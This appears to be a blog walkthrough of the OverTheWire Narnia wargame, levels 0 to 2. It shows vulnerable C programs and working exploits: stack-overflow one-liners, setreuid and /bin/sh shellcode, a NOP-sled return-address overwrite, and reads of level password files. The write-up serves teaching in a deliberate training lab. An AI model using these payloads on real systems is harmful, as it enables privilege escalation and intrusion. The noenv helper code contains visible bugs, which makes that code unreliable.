---
title: Overthewire Narnia Walkthrough
date: 2023-09-19
excerpt: Let's have some fun ;)
permalink: overthewire-narnia-walkthrough
---

## Narnia 0
In `/narnia/narnia0.c` we can find the source code of `/narnia/narnia0`

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

And it's a simple stack overflow bug because `buf` only has 20 bytes and 
`scanf` will read 24 bytes into where `buf` starts. And the extra 4 bytes
will overwrite the value in `val`.

Therefore, we can do a oneliner as follows to get shell

```bash
ssh -p 2226 narnia0@narnia.labs.overthewire.org bash -c "\"(echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde' && cat) | /narnia/narnia0\""
```

> As a sidenote, thanks to peachoolong-uwu who told me that I can embed `echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde'` inside a pair of parentheses and add `&& cat` to keep the stdin steam open.

Now once we type the password of narnia0, `/narnia/narnia0` will send us to
 a sub-shell and we should be `narnia1` in this new shell.

To get the password of user `narnia1`, we simply type 
`cat /etc/narnia_pass/narnia1` and press return.

![Get Shell, narnia0](assets/narnia0.png)


## Narnia 1

Now we have the password to log in to `narnia1`, we can find its source code
at `/narnia/narnia1.c`.

```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

`ret` is a function pointer, so once we get the value of the environment
variable, `EGG`, it will be assigned to `ret`. 

And calling `ret()` will be effeectively jump to the position of the result of
`getenv("EGG")`, it will execute whatever instruction
we set in the env var `EGG`.

Therefore, we can craft some shellcode and get shell.

```bash
$ pwn shellcraft -f d setreuid
\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80
$ pwn shellcraft -f d sh
\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80
```

Or you can use my fork of pwntools which supports multiple shellcraft commands,
[cocoa-xu/pwntools:cx-multi-shellcraft-cmd](https://github.com/cocoa-xu/pwntools/tree/cx-multi-shellcraft-cmd).

```bash
$ pwn shellcraft -f d setreuid + sh
\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80
```

So we can do this to get shell and gat the password for user `narnia2`.

```bash
EGG=`echo -e '\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80'` /narnia/narnia1
$ cat /etc/narnia_pass/narnia2
```

![Get Shell, narnia1](assets/narnia1.png)

## Narnia 2

As always, we can find the source code for narnia2 in `/narnia/narnia2.c`.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

Obviously, `strcpy` is not a safe function as it will copy everything into
`buf` until it encounters the first `NULL`, i.e., `\x00`. So this is still a
commonly seen stack overflow bug, and it will us to control the program when
exploit properly.

This time we need to know a little bit about x86 stack layout. In this example
the compiler allocated 128 bytes on stack for `char buf[128]`, and 4 bytes
above sits our `%ebp` register, and 4 more bytes above sits our `%eip` 
register. The value in the `%ebp` register pointers to the base address of the
previous frame, while `%eip` stores the return address where we'll jump to
when we return from the current function.

Let's name the string we pass to the program as `ARG`, then based on what we
already know above, we can pass in an address at `ARG[132:136]`, say 
`\x10\x20\x7c\xff` then the program will jump to `0xff7c2010` after returning
from `main`, and it will try to execute whatever instructions from 
`0xff7c2010`.

And of course, the instruction we'd like it to execute is `setreuid(0, 0)` 
and `system("/bin/sh")`. So again we can get that shellcode with the following
code.

```bash
$ pwn shellcraft -f d setreuid + sh
\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80
```

Now the question becomes which address should we put at `ARG[132:136]`. To find
that value, we can first write our shellcode:

```bash
$( \
    python3 -c "print('A'*132, end='')" && \
    echo -e '\xef\xbe\xad\xde' && \
    echo -e '\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80' \
)
```

Then we can use `gef` to get an approximate address of where should we jump.

```bash
$ gef /narnia/narnia2
gef➤ r $ARG
```

If everything goes according to the plan, we should see it segfault now.

![Segmentation Fault - Narnia2](assets/narnia2-segfault.png)


Now we can use nop sled to guide the program to our shellcode, and after
some trials and errors, the following code can do it.

/tmp/noenv /narnia/narnia2 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\xdd\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80'

where `/tmp/noenv` is a helper program which I wrote that passes no environment
variables to a program because env vars can also effect the variable addresses
on stack.

![Get Shell - Narinia 2](assets/narnia2-getshell.png)

The source code of noenv is quite straightforward:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int is_valid_hex(char h, char * b) {
    if ('0' <= h && h <= '9') {
        *b = h - '0';
        return 1;
    } else if ('a' <= h && h <= 'f') {
        *b = h - 'a' + 0xa;
        return 1;
    } else if ('A' <= h && h <= 'F') {
        *b = h - 'a' + 0xa;
        return 1;
    }
    return 0;
}

int hex2byte(char hi, char lo, char * byte) {
    char h, l;
    if (is_valid_hex(hi, &h) && is_valid_hex(lo, &l)) {
        *byte = h << 4 | l;
        return 1;
    }
    return 0;
}

char * argvdup(const char * src) {
    if (src == NULL) return NULL;
    size_t len = strlen(src);
    size_t i = 0;
    size_t j = 0;
    char * res = (char *)malloc(sizeof(char) * len);
    while (i < len) {
        if (src[i] == '\\' && src[i + 1] == 'x' && i + 3 < len) {
            char c;
            if (hex2byte(src[i + 2], src[i + 3], &c)) {
                res[j] = c;
                i += 3;
            } else {
                res[j] = src[i];
            }
        } else {
            res[j] = src[i];
        }
        j++;
        i++;
    }
    res[j] = '\0';
    return res;
}

int main(int argc, char *const argv[]) {
    if (argc > 1) {
        char ** my_argv = (char **)malloc(sizeof(char *) * (argc - 1));
        for (int i = 1; i < argc; i++) {
            my_argv[i - 1] = argvdup(argv[i]);
	        printf("[+] copying argv[%d], len=%lu\r\n", i - 1, strlen(my_argv[i - 1]));
        }
        my_argv[argc - 1] = NULL;
        char ** my_envp = (char **)malloc(sizeof(char *));
        my_envp[0] = NULL;
        printf("[+] execute %s\r\n", argv[1]);
        execve(argv[1], my_argv, my_envp);
    }
}
```

